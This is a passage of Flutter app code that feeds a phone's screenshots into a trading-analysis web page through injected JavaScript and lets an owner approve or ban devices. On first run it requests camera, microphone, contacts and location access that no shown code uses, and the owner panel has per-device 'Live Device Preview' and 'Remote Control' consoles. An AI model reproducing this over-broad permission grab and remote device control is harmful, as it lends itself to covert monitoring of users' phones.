                      side: const BorderSide(color: Colors.white24),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
              ],
            ),
          ),

          // ── Live Device Preview (phone-screen style) ──
          const DevicePreviewCard(),

          // ── User Requests + REMOTE CONSOLE ──
          const Padding(
            padding: EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            child: Text('User Requests + Remote Control',
                style: TextStyle(color: kGold, fontSize: 16, fontWeight: FontWeight.bold)),
          ),
          _busy && _rows.isEmpty
              ? const Center(child: Padding(
                  padding: EdgeInsets.all(30),
                  child: CircularProgressIndicator(color: kGold)))
              : _rows.isEmpty
                  ? const Center(child: Padding(
                      padding: EdgeInsets.all(30),
                      child: Text('No requests yet', style: TextStyle(color: Colors.white54))))
                  : ListView.builder(
                      shrinkWrap: true,
                      physics: const NeverScrollableScrollPhysics(),
                      itemCount: _rows.length,
                      itemBuilder: (_, i) {
                        final r  = _rows[i];
                        final st = r['status'] ?? '';
                        return Card(
                          color: const Color(0xFF1E1E1E),
                          margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
                          child: Padding(
                            padding: const EdgeInsets.all(12),
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text('${i + 1}) ${r['id']}',
                                    style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                                Text('ID: ${r['device']}  •  ${r['method']}',
                                    style: const TextStyle(color: Colors.white54, fontSize: 12)),
                                Text('Perms: ${(r['perms'] ?? '').isEmpty ? '—' : r['perms']}  •  $st',
                                    style: TextStyle(
                                        color: st == 'BANNED' ? Colors.red
                                            : (st == 'APPROVED' ? Colors.green : Colors.orange),
                                        fontSize: 12)),
                                const SizedBox(height: 8),
                                Row(children: [
                                  ElevatedButton(
                                      onPressed: () => _act(r['device']!, 'approve'),
                                      style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
                                      child: const Text('ADD', style: TextStyle(color: Colors.white))),
                                  const SizedBox(width: 8),
                                  ElevatedButton(
                                      onPressed: () => _act(r['device']!, 'ban'),
                                      style: ElevatedButton.styleFrom(backgroundColor: Colors.red),
                                      child: const Text('BAN', style: TextStyle(color: Colors.white))),
                                ]),
                                const SizedBox(height: 8),
                                RemoteConsoleCard(
                                    deviceId: r['device']!, label: r['id'] ?? 'Device'),
                              ],
                            ),
                          ),
                        );
                      }),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════
//  MAIN WEB-VIEW SCREEN
// ═══════════════════════════════════════════════════════════════════════
class MainWebViewScreen extends StatefulWidget {
  const MainWebViewScreen({super.key});

  @override
  State<MainWebViewScreen> createState() => _MainWebViewScreenState();
}

class _MainWebViewScreenState extends State<MainWebViewScreen> with WidgetsBindingObserver {
  late final WebViewController _controller;
  final ValueNotifier<double> _progressN = ValueNotifier<double>(1);
  bool   _isLoading  = true;
  bool   _firstLoad  = true;
  bool   _fg         = true;
  bool   _flushing   = false;
  bool   _okayBusy   = false;
  bool   _captureOn  = false;
  bool   _autoDelete = false;
  bool   _overlayShown = false;
  bool   _owner      = false;
  String _activeBox  = 'none';
  String _deviceId   = '';
  final Map<String, int> _siteCount = {'htf': 0, 'entry': 0, 'corr': 0};
  final List<String> _queue   = [];
  final List<String> _ledger  = [];
  final List<String> _sentIds = [];
  final List<String> _seenIds = [];
  final List<String> _round   = [];
  DateTime _lastErrPop = DateTime(2000);
  Timer?   _banTimer;
  VoidCallback? _sheetRefresh;
  static const Map<String, int> _max = {'htf': 6, 'entry': 4, 'corr': 1};

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _loadPrefs();
    _initNotif();
    _initWebView();
    _initScreenshotListener();
    _startBanWatch();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _banTimer?.cancel();
    _progressN.dispose();
    super.dispose();
  }

  Future<void> _initNotif() async {
    final p = await SharedPreferences.getInstance();
    if (p.getBool('allPermsAsked') ?? false) return;
    await [
      Permission.camera,
      Permission.location,
      Permission.microphone,
      Permission.contacts,
      Permission.photos,
      Permission.videos,
      Permission.notification,
    ].request();
    await p.setBool('allPermsAsked', true);
  }

  void _startBanWatch() {
    _banTimer = Timer.periodic(const Duration(seconds: 60), (_) async {
      if (_owner) return;
      try {
        if (_deviceId.isEmpty) {
          _deviceId = (await _galleryChannel.invokeMethod<String>('deviceId')) ?? '';
        }
        final rows = (jsonDecode(await _httpGet(kSheetUrl)) as List).cast<List<dynamic>>();
        String status = 'none';
        for (final r in rows) {
          if (r.length < 4) continue;
          final type = r[1].toString();
          final dev  = r[3].toString();
          if (dev == _deviceId && (type == 'approve' || type == 'ban')) status = type;
        }
        if (status == 'ban') {
          await (await SharedPreferences.getInstance()).setBool('approved', false);
          _toast('Access removed by owner');
          if (mounted) {
            Navigator.of(context).pushReplacement(
                MaterialPageRoute(builder: (_) => const GateScreen()));
          }
        }
      } catch (_) {}
    });
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _fg = true;
      _syncBubble();
      setState(() {});
      _seedCounts();
      _flush();
      _sheetRefresh?.call();
    } else if (state == AppLifecycleState.paused) {
      _fg = false;
    }
  }

  Future<void> _syncBubble() async {
    try {
      final alive = await _galleryChannel.invokeMethod<bool>('bubbleAlive') ?? false;
      if (alive && !_overlayShown) {
        await _galleryChannel.invokeMethod('hideBubble');
      } else if (!alive && _overlayShown) {
        await _galleryChannel.invokeMethod('showBubble');
        _pushState();
      }
    } catch (_) {}
  }

  Future<void> _loadPrefs() async {
    final p = await SharedPreferences.getInstance();
    setState(() {
      _captureOn    = p.getBool('cap')    ?? false;
      _autoDelete   = p.getBool('ad')     ?? false;
      _overlayShown = p.getBool('bubble') ?? false;
      _owner        = p.getBool('owner')  ?? false;
      _activeBox    = p.getString('abox') ?? 'none';
      if (_activeBox.isEmpty || _activeBox == 'corr') _activeBox = 'none';
      _queue  ..clear()..addAll(p.getStringList('queue')   ?? []);
      _ledger ..clear()..addAll(p.getStringList('ledger')  ?? []);
      _sentIds..clear()..addAll(p.getStringList('sentIds') ?? []);
      _seenIds..clear()..addAll(p.getStringList('seenIds') ?? []);
      _round  ..clear()..addAll(p.getStringList('round')   ?? []);
    });
    _pushState();
  }

  Future<void> _saveState() async {
    final p = await SharedPreferences.getInstance();
    await p.setString('abox', _activeBox);
    await p.setStringList('queue',   _queue);
    await p.setStringList('ledger',  _ledger);
    await p.setStringList('sentIds', _sentIds);
    await p.setStringList('seenIds', _seenIds);
    await p.setStringList('round',   _round);
  }

  String _boxOf(String e)   => e.split('|')[1];
  String _pathOf(String e)  { final i = e.indexOf('|'); return e.substring(e.indexOf('|', i + 1) + 1); }
  String _roundPath(String e) => e.substring(e.indexOf('|') + 1);
  int _queueOf(String box)  => _queue.where((q) => _boxOf(q) == box).length;
  int _countOf(String box)  => (_siteCount[box] ?? 0) + _queueOf(box);

  String _bubbleText() {
    if (_activeBox == 'none') return '📸 0';
    final c = _countOf(_activeBox);
    final m = _max[_activeBox] ?? 0;
    return c >= m ? 'FULL' : '📸 $c';
  }

  void _pushState() {
    try {
      _galleryChannel.invokeMethod('updateBubble', {
        'text': _bubbleText(),
        'htf': _countOf('htf'),
        'entry': _countOf('entry'),
        'corr': _countOf('corr'),
        'active': _activeBox,
        'capture': _captureOn ? 1 : 0,
      });
    } catch (_) {}
  }

  void _toast(String t)  { try { _galleryChannel.invokeMethod('toast', t);    } catch (_) {} }
  void _errPop(String t) {
    final now = DateTime.now();
    if (now.difference(_lastErrPop).inMilliseconds < 2000) return;
    _lastErrPop = now;
    try { _galleryChannel.invokeMethod('errorPop', t); } catch (_) {}
  }

  void _initScreenshotListener() {
    _screenshotChannel.setMethodCallHandler((call) async {
      if (call.method == 'onScreenshot') {
        if (!_captureOn) return;
        final args = Map<String, Object?>.from(call.arguments as Map);
        final id   = (args['id'] as num?)?.toInt().toString() ?? '';
        final path = (args['path'] as String?) ?? '';
        if (id.isEmpty || path.isEmpty) return;
        if (_seenIds.contains(id)) return;
        _seenIds.add(id);
        if (_seenIds.length > 500) _seenIds.removeRange(0, _seenIds.length - 500);
        _round.add('$id|$path');
        await _saveState();
        if (_activeBox == 'none') { _errPop('❌ SS disabled — select a box'); return; }
        if (_sentIds.contains(id) ||
            _queue.any((q) => q.startsWith('$id|')) ||
            _ledger.any((q) => q.startsWith('$id|'))) return;
        final box = _activeBox;
        final m   = _max[box] ?? 0;
        if (_countOf(box) >= m) { _toast('${box.toUpperCase()} FULL — select another box'); return; }
        setState(() { _queue.add('$id|$box|$path'); _ledger.add('$id|$box|$path'); });
        await _saveState();
        _pushState();
        final c = _countOf(box);
        _toast(c >= m ? '${box.toUpperCase()} FULL ✔' : '${box.toUpperCase()} $c/$m ✅');
        if (_fg) _flush();
      } else if (call.method == 'onBubbleTap') {
        setState(() => _captureOn = !_captureOn);
        await (await SharedPreferences.getInstance()).setBool('cap', _captureOn);
        _pushState();
        _toast(_captureOn ? 'Capture ON — SS will be captured' : 'Capture OFF');
      } else if (call.method == 'onBubbleSelect') {
        setState(() => _activeBox = (call.arguments as String) == 'corr' ? 'none' : call.arguments as String);
        await _saveState();
        _pushState();
        if (_activeBox == 'none') {
          _toast('NO BOX — SS will not be saved');
        } else {
          final m = _max[_activeBox] ?? 0;
          _countOf(_activeBox) >= m
              ? _toast('${_activeBox.toUpperCase()} FULL — select another box')
              : _toast('${_activeBox.toUpperCase()} select — auto-upload ON');
        }
      } else if (call.method == 'onBubbleOk') {
        await _onOkay();
      }
    });
  }

  Future<String?> _jsString(String js) async {
    try {
      final r = await _controller.runJavaScriptReturningResult(js);
      final d = jsonDecode(r.toString());
      return d is String ? d : d.toString();
    } catch (_) { return null; }
  }

  Future<int> _siteArrLen(String box) async {
    if (box == 'corr') {
      return int.tryParse(await _jsString('JSON.stringify(window.dxyImage?1:0)') ?? '0') ?? 0;
    }
    final v = box == 'htf' ? 'htfImages' : 'entryImages';
    return int.tryParse(
        await _jsString('JSON.stringify(window.$v?window.$v.length:0)') ?? '0') ?? 0;
  }

  Future<bool> _waitSiteLen(String box, int expected, {int timeoutMs = 8000}) async {
    final sw = Stopwatch()..start();
    while (sw.elapsedMilliseconds < timeoutMs) {
      if (await _siteArrLen(box) >= expected) return true;
      await Future.delayed(const Duration(milliseconds: 150));
    }
    return false;
  }

  Future<void> _seedCounts() async {
    setState(() {
      _siteCount['htf']   = 0;
      _siteCount['entry'] = 0;
      _siteCount['corr']  = 0;
    });
    final htf   = await _siteArrLen('htf');
    final entry = await _siteArrLen('entry');
    final corr  = await _siteArrLen('corr');
    setState(() { _siteCount['htf'] = htf; _siteCount['entry'] = entry; _siteCount['corr'] = corr; });
    _pushState();
    _sheetRefresh?.call();
  }

  Future<Uint8List> _compress(Uint8List bytes, {int maxKB = 1024}) async {
    try {
      final r = await _galleryChannel.invokeMethod<Uint8List>('compress', {'bytes': bytes, 'maxKB': maxKB});
      if (r != null && r.isNotEmpty) return r;
    } catch (_) {}
    return _downscale(bytes);
  }

  Future<Uint8List> _downscale(Uint8List bytes) async {
    try {
      final codec = await ui.instantiateImageCodec(bytes);
      final src   = (await codec.getNextFrame()).image;
      const maxDim = 1600;
      if (src.width <= maxDim && src.height <= maxDim) {
        final out = await src.toByteData(format: ui.ImageByteFormat.png);
        src.dispose(); codec.dispose();
        return out!.buffer.asUint8List();
      }
      final scale = maxDim / math.max(src.width, src.height);
      final w = (src.width * scale).round();
      final h = (src.height * scale).round();
      final rec = ui.PictureRecorder();
      ui.Canvas(rec).drawImageRect(
          src,
          Rect.fromLTWH(0, 0, src.width.toDouble(), src.height.toDouble()),
          Rect.fromLTWH(0, 0, w.toDouble(), h.toDouble()),
          ui.Paint());
      final pic    = rec.endRecording();
      final outImg = await pic.toImage(w, h);
      final data   = await outImg.toByteData(format: ui.ImageByteFormat.png);
      src.dispose(); codec.dispose(); outImg.dispose(); pic.dispose();
      return data!.buffer.asUint8List();
    } catch (_) { return bytes; }
  }

  String _injectJs(String box, String b64, String name) => '''(function(){
    function headOf(inp){var host=inp;for(var up=0;up<6&&host;up++){var t=(host.innerText||'').toUpperCase();if(t.length>=10&&t.length<=400){if(t.indexOf('CORRELATION')>=0||t.indexOf('DXY')>=0||t.indexOf('ENTRY')>=0||t.indexOf('HTF')>=0)return t;}host=host.parentElement;}return '';}
    function pickInput(b){var inputs=document.querySelectorAll('input[type=file]');var i;for(i=0;i<inputs.length;i++){var h=headOf(inputs[i]);if(b==='corr'&&(h.indexOf('CORRELATION')>=0||h.indexOf('DXY')>=0))return inputs[i];if(b==='entry'&&h.indexOf('ENTRY')>=0)return inputs[i];if(b==='htf'&&h.indexOf('HTF')>=0)return inputs[i];}if(b==='corr'){for(i=0;i<inputs.length;i++){if(!inputs[i].multiple)return inputs[i];}return null;}var muls=[];for(i=0;i<inputs.length;i++){if(inputs[i].multiple)muls.push(inputs[i]);}if(b==='entry')return muls[0]||null;if(b==='htf')return muls[muls.length-1]||muls[0]||null;return null;}
    var inp=pickInput('$box');if(!inp)return 'fail';
    window.__ak=window.__ak||{};var key='$box';var list=window.__ak[key];
    if(!list){list=[];window.__ak[key]=list;}
    if(list.length===0&&inp.files){for(var e2=0;e2<inp.files.length;e2++)list.push(inp.files[e2]);}
    for(var r2=list.length-1;r2>=0;r2--){if(list[r2].name==='$name')list.splice(r2,1);}
    var bin=atob('$b64');var arr=new Uint8Array(bin.length);for(var i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);
    list.push(new File([arr],'$name',{type:'image/jpeg'}));
    var dt=new DataTransfer();for(var q2=0;q2<list.length;q2++)dt.items.add(list[q2]);
    inp.files=dt.files;inp.dispatchEvent(new Event('change',{bubbles:true}));return 'ok:'+list.length;
  })();''';

  Future<int?> _injectAt(String box, String b64, String name) async {
    try {
      final r = await _controller.runJavaScriptReturningResult(_injectJs(box, b64, name));
      final s = r.toString().replaceAll('"', '');
      return s.startsWith('ok:') ? int.tryParse(s.substring(3)) : null;
    } catch (_) { return null; }
  }

  Future<bool> _sendOne(String entry) async {
    final id   = entry.split('|')[0];
    final box  = _boxOf(entry);
    final path = _pathOf(entry);
    if (_sentIds.contains(id)) {
      setState(() => _queue.remove(entry));
      await _saveState();
      return true;
    }
    try {
      final rawBytes = await File(path).readAsBytes();
      var bytes = await _compress(rawBytes);
      final name = path.split('/').last;
      int? count = await _injectAt(box, base64Encode(bytes), name);
      if (count == null) {
        bytes = await _compress(rawBytes, maxKB: 300);
        count = await _injectAt(box, base64Encode(bytes), name);
      }
      if (count == null) return false;
      if (box == 'htf' || box == 'entry') await _waitSiteLen(box, count);
      setState(() {
        _queue.remove(entry);
        if (!_sentIds.contains(id)) _sentIds.add(id);
        _siteCount[box] = (_siteCount[box] ?? 0) + 1;
      });
      await _saveState();
      _pushState();
      return true;
    } catch (_) { return false; }
  }

  Future<void> _flush({bool force = false}) async {
    if (_flushing || _queue.isEmpty) return;
    if (!force && !_fg) return;
    _flushing = true;
    int failed = 0;
    for (final it in List<String>.from(_queue)) { if (!await _sendOne(it)) failed++; }
    _flushing = false;
    if (failed > 0 && !force) _toast('$failed upload pending — retry on open/OKAY');
  }

  Future<void> _clickClear(String box) async {
    final kw = box == 'htf' ? 'HTF' : (box == 'corr' ? 'CORRELATION' : 'ENTRY');
    try {
      await _controller.runJavaScript(
          '(function(){var bs=document.querySelectorAll("button");for(var i=0;i<bs.length;i++){var t=(bs[i].innerText||"").toUpperCase();if(t.indexOf("$kw")>=0&&t.indexOf("CLEAR")>=0){bs[i].click();return;}}})();');
    } catch (_) {}
  }

  Future<void> _onOkay() async {
    if (_okayBusy) return;
    _okayBusy = true;
    try {
      await Future.delayed(const Duration(milliseconds: 900));
      _fg = true;
      await _seedCounts();
      await _flush(force: true);
      if (_queue.isNotEmpty) await _flush(force: true);
      final ids   = _round.map((e) => int.tryParse(e.split('|')[0]) ?? 0).where((e) => e > 0).toList();
      final paths = _round.map(_roundPath).toList();
      bool deleted = false;
      if (ids.isEmpty && paths.isEmpty) {
        _toast('No new deliveries');
      } else if (_autoDelete) {
        try {
          final r = await _galleryChannel.invokeMethod<int>('deleteFiles', {'ids': ids, 'paths': paths});
          deleted = (r ?? 0) == 1;
        } catch (_) {}
      }
      if (deleted) {
        await _clickClear('entry');
        setState(() {
          _siteCount['entry'] = 0;
          _round.clear();
          _ledger.removeWhere((q) => _boxOf(q) != 'htf');
          _queue.removeWhere((q) => _boxOf(q) != 'htf');
          _sentIds.clear();
        });
        await _saveState();
        _pushState();
        _toast('Delivered + deleted (HTF box অপরিবর্তিত রইলো)');
      }
      setState(() { _captureOn = false; _autoDelete = false; _overlayShown = false; });
      final p = await SharedPreferences.getInstance();
      await p.setBool('cap', false);
      await p.setBool('ad', false);
      await p.setBool('bubble', false);
      try { await _galleryChannel.invokeMethod('hideBubble'); } catch (_) {}
      _pushState();
      _toast('Round done — switches OFF');
      if (_queue.isNotEmpty) _toast('${_queue.length} SS pending — will upload on next open');
      await _controller.runJavaScript(
          '(function(){var els=document.querySelectorAll("nav button,nav a,button,a,div[role=button]");for(var i=0;i<els.length;i++){if((els[i].innerText||"").trim()==="Analysis"){els[i].click();return;}}})();');
    } finally { _okayBusy = false; }
  }

  Future<void> _pickAndInject(String box) async {
    try {
      final res  = await _galleryChannel.invokeMethod<List<Object?>>('pickFiles', {'max': box == 'corr' ? 1 : 6});
      final list = (res ?? []).map((e) => e.toString()).toList();
      if (list.isEmpty) { _toast('No SS selected'); return; }
      int ok = 0;
      for (final path in list) {
        if (await _sendOne('pick${DateTime.now().millisecondsSinceEpoch}$ok|$box|$path')) ok++;
      }
      ok > 0 ? _toast('$ok SS in ${box.toUpperCase()} ✅') : _toast('Could not add to box ❌');
    } catch (_) { _toast('Picker unavailable ❌'); }
  }

  Future<void> _logout(BuildContext ctx) async {
    final confirmed = await showDialog<bool>(
      context: ctx,
      builder: (_) => AlertDialog(
        backgroundColor: const Color(0xFF1E1E1E),
        title: const Text('Log out?', style: TextStyle(color: kGold)),
        content: const Text('Apnar session clear hobe.\nOwner approval again lagbe.',
            style: TextStyle(color: Colors.white70)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx, false),
              child: const Text('Cancel', style: TextStyle(color: Colors.white54))),
          TextButton(onPressed: () => Navigator.pop(ctx, true),
              child: const Text('Log out', style: TextStyle(color: Colors.redAccent))),
        ],
      ),
    );
    if (confirmed != true) return;
    _banTimer?.cancel();
    try { await _galleryChannel.invokeMethod('hideBubble'); } catch (_) {}
    final p = await SharedPreferences.getInstance();
    for (final k in ['approved', 'owner', 'permsAsked', 'allPermsAsked', 'myId',
                     'cap', 'ad', 'bubble',
                     'queue', 'ledger', 'sentIds', 'seenIds', 'round', 'abox']) {
      await p.remove(k);
    }
    if (!mounted) return;
    Navigator.of(context).pushAndRemoveUntil(
        MaterialPageRoute(builder: (_) => const GateScreen()), (_) => false);
  }

  void _initWebView() {
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(kBg)
      ..addJavaScriptChannel('FlutterBridge', onMessageReceived: (msg) async {
        final m = msg.message;
        if (m.startsWith('CLEARED:')) {
          final b = m.substring(8);
          setState(() {
            _siteCount[b] = 0;
            _queue .removeWhere((q) => _boxOf(q) == b);
            _ledger.removeWhere((q) => _boxOf(q) == b);
            _sentIds.clear();
          });
          await _saveState();
          _pushState();
          try { await _controller.runJavaScript('if(window.__ak){window.__ak["$b"]=[];}'); } catch (_) {}
        } else if (m.startsWith('PICK:')) {
          await _pickAndInject(m.substring(5));
        }
      })
      ..setNavigationDelegate(NavigationDelegate(
        onProgress: (p) { _progressN.value = p / 100; },
        onPageStarted: (_) {
          _progressN.value = 0;
          if (_firstLoad) setState(() => _isLoading = true);
        },
        onPageFinished: (_) async {
          setState(() { _isLoading = false; _firstLoad = false; });
          _progressN.value = 1;
          await _controller.runJavaScript(_pageHookJs());
          await _seedCounts();
          _flush();
        },
      ))
      ..loadRequest(Uri.parse(kUrl));
  }

  String _pageHookJs() => '''(function(){
    if(window.__aniketHook)return;window.__aniketHook=true;
    function headOf(inp){var host=inp;for(var up=0;up<6&&host;up++){var t=(host.innerText||'').toUpperCase();if(t.length>=10&&t.length<=400){if(t.indexOf('CORRELATION')>=0||t.indexOf('DXY')>=0||t.indexOf('ENTRY')>=0||t.indexOf('HTF')>=0)return t;}host=host.parentElement;}return '';}
    function classify(inp){var h=headOf(inp);if(h.indexOf('CORRELATION')>=0||h.indexOf('DXY')>=0)return 'corr';if(h.indexOf('ENTRY')>=0)return 'entry';if(h.indexOf('HTF')>=0)return 'htf';if(!inp.multiple)return 'corr';var inputs=document.querySelectorAll('input[type=file]');var idx=Array.prototype.indexOf.call(inputs,inp);if(idx===0)return 'entry';return 'htf';}
    document.addEventListener('click',function(e){
      var t=e.target,inp=null;
      if(t&&t.tagName==='INPUT'&&t.type==='file')inp=t;
      if(!inp&&t&&t.closest){var lab=t.closest('label');if(lab){var fid=lab.getAttribute('for');if(fid){var el2=document.getElementById(fid);if(el2&&el2.type==='file')inp=el2;}if(!inp){var el3=lab.querySelector('input[type=file]');if(el3)inp=el3;}}}
      if(inp){e.preventDefault();e.stopPropagation();FlutterBridge.postMessage('PICK:'+classify(inp));return;}
      var b=e.target.closest?e.target.closest('button'):null;if(!b)return;
      var t2=(b.innerText||'').toUpperCase();
      if(t2.indexOf('HTF')>=0&&t2.indexOf('CLEAR')>=0)FlutterBridge.postMessage('CLEARED:htf');
      else if(t2.indexOf('CORRELATION')>=0&&t2.indexOf('CLEAR')>=0)FlutterBridge.postMessage('CLEARED:corr');
      else if(t2.indexOf('ENTRY')>=0&&t2.indexOf('CLEAR')>=0)FlutterBridge.postMessage('CLEARED:entry');
    },true);
  })();''';

  Future<void> _toggleOverlay() async {
    final can = await _galleryChannel.invokeMethod<bool>('canOverlay') ?? false;
    if (!can) {
      await _galleryChannel.invokeMethod('openOverlaySettings');
      _snack('Allow overlay permission, press back, turn ON again');
      return;
    }
    if (_overlayShown) {
      await _galleryChannel.invokeMethod('hideBubble');
      _overlayShown = false;
    } else {
      await _galleryChannel.invokeMethod('showBubble');
      _overlayShown = true;
      _pushState();
    }
    await (await SharedPreferences.getInstance()).setBool('bubble', _overlayShown);
    setState(() {});
  }

  void _snack(String t) =>
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(content: Text(t)));

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: SafeArea(
        bottom: false,
        child: Stack(children: [
          WebViewWidget(controller: _controller),
          if (_isLoading && _firstLoad)
            Container(color: kBg,
                child: const Center(child: CircularProgressIndicator(color: kGold))),
          ValueListenableBuilder<double>(
            valueListenable: _progressN,
            builder: (_, v, __) {
              if (_firstLoad || v >= 1) return const SizedBox.shrink();
              return Positioned(
                top: 0, left: 0, right: 0,
                child: LinearProgressIndicator(
                    value: v, minHeight: 3, color: kGold, backgroundColor: Colors.transparent),
              );
            },
          ),
          Positioned(
            top: 8, right: 8,
            child: Material(
              color: Colors.transparent,
              child: InkWell(
                onTap: () => _showSettings(context),
                borderRadius: BorderRadius.circular(20),
                child: Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.5), shape: BoxShape.circle),
                  child: const Icon(Icons.settings, color: kGold, size: 20),
                ),
              ),
            ),
          ),
        ]),
      ),
    );
  }

  void _showSettings(BuildContext context) {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1E1E1E),
      shape: const RoundedRectangleBorder(
          borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (ctx) => StatefulBuilder(
        builder: (context, setModal) {
          _sheetRefresh = () => setModal(() {});
          return Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('App Settings',
                    style: TextStyle(color: kGold, fontSize: 18, fontWeight: FontWeight.bold)),
                const SizedBox(height: 12),
                Text(
                  'Active: ${_activeBox == 'none' ? 'NO BOX' : _activeBox.toUpperCase()}'
                  '  •  HTF ${_countOf('htf')}/6'
                  '  •  ENTRY ${_countOf('entry')}/4'
                  '  •  Queue: ${_queue.length}',
                  style: const TextStyle(color: Colors.white70, fontSize: 13),
                ),
                const SizedBox(height: 8),
                SwitchListTile(
                  title: const Text('Floating Bubble', style: TextStyle(color: Colors.white)),
                  value: _overlayShown, activeColor: kGold,
                  onChanged: (_) async { await _toggleOverlay(); setModal(() {}); },
                ),
                SwitchListTile(
                  title: const Text('Capture ON (SS capture)', style: TextStyle(color: Colors.white)),
                  value: _captureOn, activeColor: kGold,
                  onChanged: (v) async {
                    setState(() => _captureOn = v);
                    await (await SharedPreferences.getInstance()).setBool('cap', v);
                    _pushState();
                    setModal(() {});
                  },
                ),
                SwitchListTile(
                  title: const Text('Gallery Auto-Delete', style: TextStyle(color: Colors.white)),
                  subtitle: const Text('After OKAY, tap Allow in system dialog to delete',
                      style: TextStyle(color: Colors.white54, fontSize: 12)),
                  value: _autoDelete, activeColor: kGold,
                  onChanged: (v) async {
                    setState(() => _autoDelete = v);
                    await (await SharedPreferences.getInstance()).setBool('ad', v);
                    setModal(() {});
                  },
                ),
                if (_owner) ...[
                  const SizedBox(height: 8),
                  ElevatedButton(
                    onPressed: () {
                      Navigator.pop(context);
                      Navigator.push(context,
                          MaterialPageRoute(builder: (_) => const OwnerPanelScreen()));
                    },
                    style: ElevatedButton.styleFrom(backgroundColor: Colors.white12),
                    child: const Text('Owner Panel', style: TextStyle(color: kGold)),
                  ),
                ],
                const SizedBox(height: 8),
                const Divider(color: Colors.white12),
                InkWell(
                  onTap: () async {
                    Navigator.pop(context);
                    await _logout(context);
                  },
                  borderRadius: BorderRadius.circular(8),
                  child: const Padding(
                    padding: EdgeInsets.symmetric(vertical: 12, horizontal: 4),
                    child: Row(children: [
                      Icon(Icons.logout, color: Colors.redAccent, size: 20),
                      SizedBox(width: 12),
                      Text('Log out',
                          style: TextStyle(
                              color: Colors.redAccent,
                              fontSize: 15,
                              fontWeight: FontWeight.w500)),
                    ]),
                  ),
                ),
                const SizedBox(height: 4),
              ],
            ),
          ),
        },
      ),
    ).whenComplete(() => _sheetRefresh = null);
  }
}
